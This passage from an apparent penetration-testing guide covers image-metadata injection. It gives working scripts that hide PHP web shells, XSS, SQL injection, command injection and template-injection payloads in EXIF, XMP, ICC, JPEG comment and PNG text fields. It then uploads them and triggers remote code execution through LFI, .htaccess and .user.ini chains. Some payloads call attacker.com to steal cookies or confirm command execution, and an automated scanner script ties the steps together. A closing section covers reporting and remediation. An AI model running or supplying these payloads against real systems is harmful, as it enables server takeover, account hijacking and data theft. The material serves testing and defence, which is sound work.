    -Model="' AND extractvalue(1,concat(0x7e,version(),0x7e))--" \
    -Software="'); INSERT INTO users(username,password) VALUES('hacker','hacked');--" \
    -overwrite_original sqli_base.jpg

  cp sqli_base.jpg exif_sqli.jpg

  # ═══════════════════════════════════════════════
  # EXIF Command Injection Payloads
  # For apps that pass EXIF data to shell commands
  # Common when using exiftool, ImageMagick, etc. via CLI
  # ═══════════════════════════════════════════════

  python3 -c "from PIL import Image; Image.new('RGB',(100,100),'orange').save('cmdi_base.jpg','JPEG',quality=95)" 2>/dev/null

  exiftool \
    -Artist='$(id)' \
    -Comment='`whoami`' \
    -Copyright='|id' \
    -Make=';id' \
    -Model='&&id' \
    -Software='||id' \
    -ImageDescription='$(cat /etc/passwd)' \
    -DocumentName='`curl http://attacker.com/cmdi`' \
    -overwrite_original cmdi_base.jpg

  cp cmdi_base.jpg exif_cmdi.jpg

  # ═══════════════════════════════════════════════
  # EXIF SSTI (Server-Side Template Injection) Payloads
  # For apps that render EXIF data through template engines
  # ═══════════════════════════════════════════════

  python3 -c "from PIL import Image; Image.new('RGB',(100,100),'purple').save('ssti_base.jpg','JPEG',quality=95)" 2>/dev/null

  exiftool \
    -Comment='{{7*7}}' \
    -Artist='${7*7}' \
    -Copyright='<%= 7*7 %>' \
    -Make='#{7*7}' \
    -Model='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}' \
    -Software='{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}' \
    -overwrite_original ssti_base.jpg

  cp ssti_base.jpg exif_ssti.jpg

  echo "[+] All injection images created"
  ls -la exif_sqli.jpg exif_cmdi.jpg exif_ssti.jpg

  rm -f sqli_base.jpg cmdi_base.jpg ssti_base.jpg
  ```
  :::
::

---

## Delivery & Exploitation

### Upload & Trigger

::tabs
  :::tabs-item{icon="i-lucide-upload" label="Upload EXIF-Injected Images"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ EXIF Payload Upload & Trigger ═══"

  # ── Upload PHP EXIF shell ──
  echo "[*] Uploading PHP EXIF shell..."
  curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@exif_php_payloads/exif_php_system.jpg;filename=vacation_photo.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" -o /tmp/upload_resp.txt

  cat /tmp/upload_resp.txt | head -3

  # ── Upload XSS EXIF payload ──
  echo "[*] Uploading XSS EXIF payload..."
  curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@exif_xss_all_fields.jpg;filename=profile_pic.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" -o /tmp/upload_resp2.txt

  cat /tmp/upload_resp2.txt | head -3

  # ── Upload SQLi EXIF payload ──
  echo "[*] Uploading SQLi EXIF payload..."
  curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@exif_sqli.jpg;filename=team_photo.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" -o /tmp/upload_resp3.txt

  cat /tmp/upload_resp3.txt | head -3

  # ── Upload multi-payload image ──
  echo "[*] Uploading multi-payload image..."
  curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@exif_multi_payload.jpg;filename=event_photo.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" -o /tmp/upload_resp4.txt

  cat /tmp/upload_resp4.txt | head -3

  rm -f /tmp/upload_resp*.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Trigger PHP Execution (LFI Chain)"}
  ```bash
  # ═══════════════════════════════════════════════
  # Scenario: Application has LFI vulnerability
  # include($_GET['page'] . '.php');
  # Or: include('/uploads/' . $_GET['file']);
  # ═══════════════════════════════════════════════

  TARGET="https://target.com"

  # ── Method 1: Direct LFI to uploaded image ──
  # If application includes files with full path
  curl -s "${TARGET}/index.php?page=../uploads/vacation_photo.jpg%00&cmd=id"
  curl -s "${TARGET}/index.php?file=uploads/vacation_photo.jpg&cmd=id"

  # ── Method 2: LFI with path traversal to upload directory ──
  for depth in 1 2 3 4 5 6; do
      TRAVERSAL=$(printf '../%.0s' $(seq 1 $depth))
      RESULT=$(curl -s "${TARGET}/index.php?page=${TRAVERSAL}uploads/vacation_photo.jpg%00&cmd=id" 2>/dev/null)
      if echo "$RESULT" | grep -q "uid="; then
          echo "[+] RCE via LFI at depth ${depth}!"
          echo "    URL: ${TARGET}/index.php?page=${TRAVERSAL}uploads/vacation_photo.jpg%00&cmd=id"
          echo "    Output: $(echo "$RESULT" | grep 'uid=')"
          break
      fi
  done

  # ── Method 3: PHP filter wrapper (if include appends .php) ──
  # This doesn't work directly for EXIF PHP, but useful for source read
  curl -s "${TARGET}/index.php?page=php://filter/convert.base64-encode/resource=../uploads/vacation_photo"

  # ── Method 4: .htaccess chain (if .htaccess upload possible) ──
  # Upload .htaccess first
  echo 'AddType application/x-httpd-php .jpg' > .htaccess
  curl -s -X POST "${TARGET}/api/upload" \
    -F "file=@.htaccess;filename=.htaccess" \
    -H "Cookie: session=TOKEN"

  # Now the EXIF-injected image executes as PHP when accessed directly
  curl -s "${TARGET}/uploads/vacation_photo.jpg?cmd=id"

  # ── Method 5: .user.ini chain (for PHP-FPM) ──
  echo 'auto_prepend_file=vacation_photo.jpg' > .user.ini
  curl -s -X POST "${TARGET}/api/upload" \
    -F "file=@.user.ini;filename=.user.ini" \
    -H "Cookie: session=TOKEN"

  # Access any .php file in the upload directory
  sleep 10  # Wait for .user.ini cache
  curl -s "${TARGET}/uploads/index.php?cmd=id"
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Trigger XSS Execution"}
  ```bash
  # ═══════════════════════════════════════════════
  # XSS triggers when application DISPLAYS EXIF data
  # ═══════════════════════════════════════════════

  TARGET="https://target.com"

  echo "═══ XSS Trigger Points ═══"

  # ── Check pages that display EXIF data ──
  PAGES=(
      "${TARGET}/gallery"
      "${TARGET}/photos"
      "${TARGET}/media"
      "${TARGET}/profile"
      "${TARGET}/user/images"
      "${TARGET}/admin/media"
      "${TARGET}/api/photos/details"
      "${TARGET}/photo/info"
      "${TARGET}/image-viewer"
  )

  for page in "${PAGES[@]}"; do
      BODY=$(curl -s "$page" -H "Cookie: session=TOKEN" 2>/dev/null)

      # Check for EXIF XSS execution indicators
      if echo "$BODY" | grep -qiE "<script>alert|onerror=alert|onload=alert"; then
          echo "[+] EXIF XSS payload found in: $page"
          echo "    Payload appears unencoded in HTML response!"
      fi

      # Check for raw EXIF data in response
      if echo "$BODY" | grep -qiE "artist|copyright|camera|comment|description" | head -1; then
          echo "[~] EXIF data displayed at: $page (check if encoded)"
      fi
  done

  echo ""
  echo "[*] Manual verification:"
  echo "    1. Upload EXIF XSS image as profile photo"
  echo "    2. Visit your profile page in browser"
  echo "    3. If alert() pops up → Stored XSS via EXIF confirmed"
  echo "    4. Check if OTHER users see the XSS when viewing your profile"
  ```
  :::
::

### Specific Exploit Chains

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: EXIF PHP → .htaccess → Direct RCE
  ---
  1. Upload image with PHP in EXIF Comment field
  2. Upload `.htaccess` with `AddType application/x-httpd-php .jpg`
  3. Access uploaded image directly → PHP in EXIF executes
  4. `https://target.com/uploads/photo.jpg?cmd=id`
  5. Full RCE through a valid image file
  :::

  :::card
  ---
  icon: i-lucide-link
  title: EXIF PHP → LFI → RCE
  ---
  1. Upload image with PHP in ALL EXIF fields
  2. Find LFI vulnerability in application
  3. Include the uploaded image: `?page=../uploads/photo.jpg`
  4. PHP interpreter finds `<?php ?>` tags in EXIF
  5. Code executes on the server
  :::

  :::card
  ---
  icon: i-lucide-link
  title: EXIF XSS → Photo Gallery → Account Takeover
  ---
  1. Upload image with `<script>` in EXIF Artist field
  2. Application displays "Photo by: [Artist]" without encoding
  3. Any user viewing the photo gallery triggers XSS
  4. JavaScript steals session cookie
  5. Attacker takes over victim's account
  :::

  :::card
  ---
  icon: i-lucide-link
  title: EXIF SQLi → Database Query → Data Breach
  ---
  1. Upload image with SQL injection in EXIF Copyright field
  2. Application: `INSERT INTO photos (copyright) VALUES ('[Copyright]')`
  3. SQL injection breaks out of string context
  4. UNION SELECT extracts database contents
  5. Credentials, PII, or admin data exfiltrated
  :::

  :::card
  ---
  icon: i-lucide-link
  title: EXIF Command Injection → ImageMagick → RCE
  ---
  1. Upload image with shell metacharacters in EXIF fields
  2. Application runs `exiftool /uploads/photo.jpg` or `identify -verbose`
  3. EXIF data containing `$(id)` or `` `whoami` `` is processed by shell
  4. Command injection executes on the server
  5. Full RCE through image processing pipeline
  :::

  :::card
  ---
  icon: i-lucide-link
  title: EXIF SSTI → Template Rendering → RCE
  ---
  1. Upload image with `{{7*7}}` in EXIF Comment
  2. Application renders EXIF data through Jinja2/Twig template
  3. Template engine evaluates the expression → outputs `49`
  4. Escalate to `{{config.__class__.__init__.__globals__["os"].popen("id").read()}}`
  5. Full RCE through template injection
  :::
::

---

## Advanced Techniques

### EXIF That Survives Re-encoding

Some applications strip EXIF data by re-encoding images through GD library, Pillow, or ImageMagick. These techniques attempt to survive that process.

::accordion
  :::accordion-item{icon="i-lucide-shield-off" label="ICC Color Profile Injection"}
  ```python [icc_payload_injection.py]
  #!/usr/bin/env python3
  """
  Inject payload into ICC color profile.
  ICC profiles are often preserved during image re-encoding
  because stripping them changes the image's color appearance.
  """
  from PIL import Image
  import io
  import struct

  def create_icc_payload_image(output_path, payload):
      """Embed payload in ICC color profile"""
      payload_bytes = payload.encode() if isinstance(payload, str) else payload

      # Create a minimal valid ICC profile containing the payload
      # ICC profile structure: header (128 bytes) + tag table + tag data
      icc_header = bytearray(128)

      # Profile size (will be updated)
      # Preferred CMM type
      icc_header[4:8] = b'\x00\x00\x00\x00'
      # Profile version (2.1.0)
      icc_header[8:12] = b'\x02\x10\x00\x00'
      # Device class (Display)
      icc_header[12:16] = b'mntr'
      # Color space (RGB)
      icc_header[16:20] = b'RGB '
      # Connection space (XYZ)
      icc_header[20:24] = b'XYZ '
      # Date/time
      icc_header[24:36] = b'\x00' * 12
      # Profile file signature
      icc_header[36:40] = b'acsp'
      # Primary platform (Apple)
      icc_header[40:44] = b'APPL'

      # Tag table — one tag containing our payload
      tag_count = struct.pack('>I', 1)
      # Tag: 'desc' (profile description) — commonly preserved
      tag_sig = b'desc'
      tag_offset = struct.pack('>I', 128 + 4 + 12)  # After header + count + 1 tag entry
      tag_size = struct.pack('>I', len(payload_bytes) + 12)

      tag_table = tag_count + tag_sig + tag_offset + tag_size

      # Tag data — 'desc' type
      tag_data = b'desc'  # Type signature
      tag_data += b'\x00\x00\x00\x00'  # Reserved
      tag_data += struct.pack('>I', len(payload_bytes))
      tag_data += payload_bytes

      # Assemble profile
      icc_data = bytes(icc_header) + tag_table + tag_data

      # Update profile size in header
      icc_data = struct.pack('>I', len(icc_data)) + icc_data[4:]

      # Create image with ICC profile
      img = Image.new('RGB', (100, 100), (128, 64, 192))
      pixels = img.load()
      for x in range(100):
          for y in range(100):
              pixels[x, y] = ((x*5+50)%256, (y*7+100)%256, ((x+y)*3+75)%256)

      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=95, icc_profile=icc_data)

      with open(output_path, 'wb') as f:
          f.write(buf.getvalue())

      print(f"[+] {output_path} — ICC profile payload ({len(icc_data)} byte profile)")

  create_icc_payload_image('icc_php.jpg', '<?php system($_GET["cmd"]); ?>')
  create_icc_payload_image('icc_xss.jpg', '<script>alert(document.domain)</script>')
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="XMP Metadata Injection"}
  ```bash
  # XMP (Extensible Metadata Platform) is XML-based metadata
  # stored inside images. It's often preserved by more processors
  # than standard EXIF because it's used by Adobe tools.

  # Create base image
  python3 -c "from PIL import Image; Image.new('RGB',(100,100),'cyan').save('xmp_base.jpg','JPEG',quality=95)" 2>/dev/null

  # ── Inject PHP into XMP ──
  exiftool \
    -XMP-dc:Description='<?php system($_GET["cmd"]); ?>' \
    -XMP-dc:Creator='<?php eval($_POST["e"]); ?>' \
    -XMP-dc:Rights='<?=`$_GET[c]`?>' \
    -XMP-dc:Title='<?php passthru($_GET["cmd"]); ?>' \
    -XMP-dc:Subject='<?php echo shell_exec($_GET["cmd"]); ?>' \
    -XMP-xmp:CreatorTool='<?php phpinfo(); ?>' \
    -XMP-photoshop:Instructions='<?php system($_GET["cmd"]); ?>' \
    -overwrite_original xmp_base.jpg

  # ── Inject XSS into XMP ──
  exiftool \
    -XMP-dc:Description='<script>alert("XMP XSS: "+document.domain)</script>' \
    -overwrite_original xmp_base.jpg

  cp xmp_base.jpg xmp_payload.jpg

  # Verify XMP data
  exiftool xmp_payload.jpg | grep -iE "description|creator|rights|title|subject|tool|instructions"

  # ── Inject raw XMP sidecar (for maximum control) ──
  cat > payload.xmp << 'XMPEOF'
  <?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>
  <x:xmpmeta xmlns:x="adobe:ns:meta/">
  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <rdf:Description rdf:about=""
    xmlns:dc="http://purl.org/dc/elements/1.1/">
  <dc:description>
    <rdf:Alt>
      <rdf:li xml:lang="x-default"><?php system($_GET["cmd"]); ?></rdf:li>
    </rdf:Alt>
  </dc:description>
  </rdf:Description>
  </rdf:RDF>
  </x:xmpmeta>
  <?xpacket end="w"?>
  XMPEOF

  exiftool -XMP<=payload.xmp -overwrite_original xmp_base.jpg 2>/dev/null

  rm -f xmp_base.jpg payload.xmp
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="JPEG COM Segment Injection (Direct Binary)"}
  ```python [com_segment_injection.py]
  #!/usr/bin/env python3
  """
  Inject payload directly into JPEG COM (Comment) segment.
  This is the lowest-level injection — works even when EXIF
  libraries fail or aren't available.
  The COM segment often survives image processing.
  """
  import struct
  from PIL import Image
  import io

  def inject_com_segment(output_path, payload, width=100, height=100):
      """Inject payload into JPEG COM (0xFFFE) segment"""
      payload_bytes = payload.encode() if isinstance(payload, str) else payload

      # Create valid JPEG
      img = Image.new('RGB', (width, height), (200, 100, 50))
      pixels = img.load()
      for x in range(width):
          for y in range(height):
              pixels[x, y] = ((x*3+100)%256, (y*7+50)%256, ((x+y)*5)%256)

      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=95, subsampling=0)
      jpeg_data = buf.getvalue()

      # Insert COM segment right after SOI marker
      soi = jpeg_data[:2]  # FF D8
      rest = jpeg_data[2:]

      # Skip existing APP0 (JFIF) if present
      pos = 0
      while pos < len(rest) - 3:
          if rest[pos] == 0xFF and rest[pos+1] in [0xE0, 0xE1, 0xE2]:
              seg_len = struct.unpack('>H', rest[pos+2:pos+4])[0]
              pos += 2 + seg_len
          else:
              break

      # Build COM segment
      com_marker = b'\xFF\xFE'
      com_length = struct.pack('>H', len(payload_bytes) + 2)
      com_segment = com_marker + com_length + payload_bytes

      # Reassemble
      result = soi + rest[:pos] + com_segment + rest[pos:]

      with open(output_path, 'wb') as f:
          f.write(result)

      # Verify
      try:
          Image.open(output_path).verify()
          valid = "✓ Valid"
      except:
          valid = "? Check"

      print(f"[+] {output_path} — COM injection ({len(result)} bytes) [{valid}]")

  # Generate payloads
  inject_com_segment('com_php_system.jpg', '<?php system($_GET["cmd"]); ?>')
  inject_com_segment('com_php_eval.jpg', '<?php eval($_POST["e"]); ?>')
  inject_com_segment('com_xss_alert.jpg', '<script>alert(document.domain)</script>')
  inject_com_segment('com_xss_steal.jpg', '<script>fetch("https://attacker.com/x?c="+document.cookie)</script>')
  inject_com_segment('com_sqli.jpg', "' OR '1'='1' --")
  inject_com_segment('com_ssti.jpg', '{{7*7}}${7*7}<%= 7*7 %>')
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="PNG tEXt Chunk Injection"}
  ```bash
  # PNG uses text chunks (tEXt, zTXt, iTXt) for metadata
  # These often survive processing and are equivalent to EXIF for PNG

  python3 -c "
  import struct, zlib
  from PIL import Image, PngImagePlugin
  import io

  def png_text_inject(output, payloads):
      img = Image.new('RGBA', (100, 100), (255, 0, 0, 255))
      info = PngImagePlugin.PngInfo()

      for key, value in payloads.items():
          info.add_text(key, value)

      img.save(output, 'PNG', pnginfo=info)
      print(f'[+] {output} — PNG with {len(payloads)} text chunks')

  # PHP payloads
  png_text_inject('png_exif_php.png', {
      'Comment': '<?php system(\$_GET[\"cmd\"]); ?>',
      'Description': '<?php eval(\$_POST[\"e\"]); ?>',
      'Author': '<?=\`\$_GET[c]\`?>',
      'Copyright': '<?php passthru(\$_GET[\"cmd\"]); ?>',
      'Software': '<?php echo shell_exec(\$_GET[\"cmd\"]); ?>',
  })

  # XSS payloads
  png_text_inject('png_exif_xss.png', {
      'Comment': '<script>alert(document.domain)</script>',
      'Description': '<img src=x onerror=alert(document.domain)>',
      'Author': '<svg onload=alert(document.domain)>',
  })

  # SQLi payloads
  png_text_inject('png_exif_sqli.png', {
      'Comment': \"' OR '1'='1' --\",
      'Author': \"' UNION SELECT username,password FROM users--\",
  })
  "
  ```
  :::
::

---

## Comprehensive Upload & Test

::code-collapse
```python [exif_exploit_scanner.py]
#!/usr/bin/env python3
"""
EXIF Payload Injection Scanner
Uploads images with EXIF payloads and checks for execution/display
"""
import requests
import os
import time
import re
import urllib3
urllib3.disable_warnings()

class ExifExploitScanner:
    def __init__(self, upload_url, field="file", cookies=None):
        self.upload_url = upload_url
        self.field = field
        self.session = requests.Session()
        self.session.verify = False
        if cookies:
            self.session.cookies.update(cookies)
        self.base_url = upload_url.rsplit('/', 2)[0]
        self.results = {'xss': [], 'rce': [], 'sqli': []}

    def create_exif_image(self, payloads):
        """Create JPEG with payloads in EXIF using PIL + struct"""
        from PIL import Image
        import struct, io

        img = Image.new('RGB', (100, 100), (100, 150, 200))
        buf = io.BytesIO()
        img.save(buf, 'JPEG', quality=95)
        jpg = buf.getvalue()

        # Inject all payloads as COM segments
        com_data = b''
        for payload in payloads:
            p = payload.encode() if isinstance(payload, str) else payload
            com_data += b'\xff\xfe' + struct.pack('>H', len(p) + 2) + p

        return jpg[:2] + com_data + jpg[2:]

    def upload(self, content, filename):
        """Upload image"""
        files = {self.field: (filename, content, 'image/jpeg')}
        try:
            r = self.session.post(self.upload_url, files=files, timeout=20)
            return r.status_code, r.text
        except:
            return 0, ''

    def check_xss(self, pages):
        """Check if XSS payloads appear unencoded in responses"""
        for page in pages:
            try:
                r = self.session.get(page, timeout=10)
                if '<script>alert' in r.text and '&lt;script&gt;' not in r.text:
                    return page, 'XSS payload unencoded!'
                if 'onerror=alert' in r.text and '&quot;' not in r.text:
                    return page, 'Event handler XSS unencoded!'
            except:
                pass
        return None, None

    def check_rce(self, filename):
        """Check if PHP in EXIF executes (via LFI or direct access)"""
        dirs = ['uploads', 'files', 'media', 'images']
        for d in dirs:
            url = f"{self.base_url}/{d}/{filename}"
            try:
                r = self.session.get(url, params={'cmd': 'echo EXIF_RCE_CONFIRMED'}, timeout=5)
                if 'EXIF_RCE_CONFIRMED' in r.text:
                    return url
            except:
                pass
        return None

    def scan(self):
        """Run full EXIF injection scan"""
        print(f"[*] Target: {self.upload_url}")
        print("-" * 60)

        # XSS Test
        print("\n[*] Testing EXIF XSS...")
        xss_payloads = [
            '<script>alert("EXIF_XSS_"+document.domain)</script>',
            '"><img src=x onerror=alert("EXIF_IMG_XSS")>',
            '<svg onload=alert("EXIF_SVG_XSS")>',
        ]
        xss_content = self.create_exif_image(xss_payloads)
        status, resp = self.upload(xss_content, 'xss_test.jpg')
        print(f"    Upload: [{status}]")

        # Check common display pages
        pages = [f"{self.base_url}/{p}" for p in
                 ['gallery', 'photos', 'media', 'profile', 'admin/media',
                  'api/photos', 'user/images']]
        xss_url, xss_detail = self.check_xss(pages)
        if xss_url:
            print(f"    [!!!] EXIF XSS CONFIRMED at: {xss_url}")
            self.results['xss'].append({'url': xss_url, 'detail': xss_detail})

        # PHP RCE Test
        print("\n[*] Testing EXIF PHP (requires LFI or handler override)...")
        php_payloads = [
            '<?php echo "EXIF_RCE_CONFIRMED"; system($_GET["cmd"]); ?>',
        ]
        php_content = self.create_exif_image(php_payloads)
        status, resp = self.upload(php_content, 'rce_test.jpg')
        print(f"    Upload: [{status}]")

        rce_url = self.check_rce('rce_test.jpg')
        if rce_url:
            print(f"    [!!!] EXIF RCE CONFIRMED at: {rce_url}")
            self.results['rce'].append({'url': rce_url})

        # SQLi Test
        print("\n[*] Testing EXIF SQLi...")
        sqli_payloads = [
            "' OR '1'='1' --",
            "' AND SLEEP(5)--",
        ]
        sqli_content = self.create_exif_image(sqli_payloads)
        status, resp = self.upload(sqli_content, 'sqli_test.jpg')
        print(f"    Upload: [{status}]")
        # SQLi detection requires checking for DB errors or time delays

        # Summary
        print(f"\n{'='*60}")
        print(f"XSS:  {len(self.results['xss'])} confirmed")
        print(f"RCE:  {len(self.results['rce'])} confirmed")
        print(f"SQLi: {len(self.results['sqli'])} confirmed")

if __name__ == "__main__":
    scanner = ExifExploitScanner(
        upload_url="https://target.com/api/upload",
        field="file",
        cookies={"session": "AUTH_TOKEN"},
    )
    scanner.scan()
```
::

---

## Reporting & Remediation

### Report Structure

::steps{level="4"}

#### Title
`[Stored XSS / RCE / SQLi] via EXIF Metadata Injection in Image Upload at [Endpoint]`

#### Root Cause
The application reads and [displays/includes/inserts] EXIF metadata from uploaded images without sanitization. Specifically, the `[Comment/Artist/Copyright]` EXIF field is rendered in [HTML page/SQL query/template/command] without proper encoding or parameterization.

#### Reproduction
```bash
# 1. Create image with payload in EXIF
exiftool -Comment='<script>alert(document.domain)</script>' photo.jpg

# 2. Upload image
curl -X POST "https://target.com/api/upload" \
  -F "file=@photo.jpg;type=image/jpeg" \
  -H "Cookie: session=TOKEN"

# 3. View page that displays EXIF data
# Navigate to: https://target.com/gallery → XSS fires
```

#### Impact
An attacker can inject [executable PHP code / JavaScript / SQL commands] through image EXIF metadata. Since the uploaded file is a genuinely valid image, it passes all content validation checks. When the application processes the EXIF data, the injected code executes, resulting in [full server compromise / session hijacking / database breach].

::

### Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Strip All Metadata on Upload
  ---
  Remove ALL EXIF, IPTC, XMP, and ICC data from uploaded images during processing. Re-encode images through an image library to produce clean files with no metadata.

  ```php
  // PHP GD — strips all metadata
  $img = imagecreatefromjpeg($uploaded_file);
  imagejpeg($img, $destination, 90);
  imagedestroy($img);
  ```

  ```python
  # Python Pillow — strips metadata
  img = Image.open(uploaded_file)
  clean = Image.new(img.mode, img.size)
  clean.putdata(list(img.getdata()))
  clean.save(destination, 'JPEG', quality=90)
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: HTML-Encode All EXIF Output
  ---
  When displaying EXIF data on web pages, always use context-appropriate output encoding. Never insert raw EXIF values into HTML, JavaScript, SQL, or commands.

  ```php
  echo htmlspecialchars($exif['Artist'], ENT_QUOTES, 'UTF-8');
  ```

  ```python
  from markupsafe import escape
  return escape(exif_data['Artist'])
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Parameterize Database Queries
  ---
  Never concatenate EXIF values into SQL queries. Use parameterized queries / prepared statements exclusively.

  ```php
  $stmt = $pdo->prepare("INSERT INTO photos (artist) VALUES (?)");
  $stmt->execute([$exif['Artist']]);
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Never Include Uploaded Files
  ---
  Never use `include()`, `require()`, or equivalent functions on uploaded files. If you must process uploaded content, use strict whitelists and sandboxed environments.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Sanitize Before Command Execution
  ---
  Never pass EXIF data to shell commands. If you must use command-line tools like `exiftool`, use proper argument escaping and avoid shell interpretation.

  ```python
  import subprocess
  subprocess.run(['exiftool', '-Comment', uploaded_file],
                 capture_output=True, shell=False)
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Validate EXIF Field Content
  ---
  If EXIF data must be preserved, validate each field against a strict pattern. Camera names, dates, and GPS coordinates have predictable formats — reject values containing `<`, `>`, `<?`, `{{`, `'`, or other injection characters.
  :::
::